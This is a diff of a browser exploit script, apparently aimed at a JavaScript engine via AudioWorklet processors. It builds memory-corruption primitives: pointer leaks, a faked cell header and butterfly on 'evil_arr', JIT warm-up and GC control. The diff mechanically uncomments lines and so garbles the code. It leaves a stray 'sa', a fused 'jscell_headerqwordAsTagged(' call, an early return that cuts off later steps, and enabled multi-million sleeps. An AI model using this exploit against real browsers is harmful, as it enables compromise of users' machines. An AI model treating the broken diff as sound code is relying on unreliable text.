@@ -20,7 +20,7 @@ var qwordAsTagged = qword =>{
 var qwordAsFloat = qword => {
     data_view.setUint32(0, qword%0x100000000, true);
     data_view.setUint32(4, qword/0x100000000, true);
-    //data_view.setBigUint64(0, qword);
+    data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
 function change_container(header, arr){
@@ -32,8 +32,8 @@ function change_container(header, arr){
     }
 }
 const MY_OBJECT_OFFSET = 0x14fb0;
-//MakeJitCompiledFunction();
-//MakeJitCompiledFunction();
+MakeJitCompiledFunction();
+MakeJitCompiledFunction();
 
 
 var a= new Array(10);
@@ -60,7 +60,7 @@ victim['prop'] = 13.37;
 victim['prop_1'] = 13.37;
 let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
 
-//var gcPreventer = [];
+var gcPreventer = [];
 var structure_id = 0;
 c[0] = 1.1;
 var fuck = undefined;
@@ -84,7 +84,7 @@ for(var i = 0; i < 0x10000; i++){
 }
 `);
 b.process = (inputs, outputs, parameters)=>{
-    //sa
+    sa
     if(stage == "leak"){
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
@@ -92,11 +92,11 @@ b.process = (inputs, outputs, parameters)=>{
         c[9] = qwordAsFloat(0x0);
         stage  = "bypass_etc";
         fuck.port.postMessage(c);
-        //sleep(4000);
+        sleep(4000);
         return true;
     }
     else if(stage == "bypass_etc"){
-        //fuck.port.postMessage(typeof parameters);
+        fuck.port.postMessage(typeof parameters);
         var gcPreventer = [];
         for (let i = 0; i < 2; i++) {
             let a = i == 0 ? parameters : victim;
@@ -117,16 +117,16 @@ b.process = (inputs, outputs, parameters)=>{
             
             c[8] = qwordAsFloat(0);
             parameters = null;
-            //sleep(10000000);
-            //stage = "leak";
+            sleep(10000000);
+            stage = "leak";
             return false;
         }
         fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
         
-        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
-        //return false;
-        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
-        //change_container(cellHeader, evil_arr);
+        fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
+        return false;
+        var cellHeader = jscell_headerqwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
+        change_container(cellHeader, evil_arr);
         c[8] = qwordAsFloat(evil_arr_butterfly);
         evil_arr[0] = cellHeader;
         evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);
@@ -145,7 +145,7 @@ b.process = (inputs, outputs, parameters)=>{
         var boxed_offset = 0;
         for(var i = 0; i < evil_arr.length; i++){
             if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
-                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
+                fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
                 boxed_offset = i;
                 break;
             }
@@ -164,16 +164,16 @@ b.process = (inputs, outputs, parameters)=>{
     else if(stage=="gc_test"){
         gc();
         fuck.port.postMessage("Garbage Collected");
-        //sleep(100000);
+        sleep(100000);
         return false;
     }
-    //  sleep(2000);
+      sleep(2000);
     return true;
 }
 class OrigineWorklet extends AudioWorkletProcessor {
     constructor(){
         super();
-        //var fuck2 = new AudioWorkletProcessor();
+        var fuck2 = new AudioWorkletProcessor();
         return b;
     }
     static get parameterDescriptors() {
@@ -187,12 +187,12 @@ class OrigineWorklet extends AudioWorkletProcessor {
 class OrigineWorklet2 extends AudioWorkletProcessor {
     constructor(){
         super();
-        //console.log(c);
+        console.log(c);
         this.port.onmessage = (e)=>{
         }
         
         fuck = this;
-        //fuck.port.postMessage(c);
+        fuck.port.postMessage(c);
         return this;
     }
     static get parameterDescriptors() {
@@ -202,9 +202,9 @@ class OrigineWorklet2 extends AudioWorkletProcessor {
         }];
     }
     process (inputs, outputs, parameters) {
-        //
-        //
-        //this.port.postMessage(c);
+        
+        
+        this.port.postMessage(c);
         return false;
     }
 }
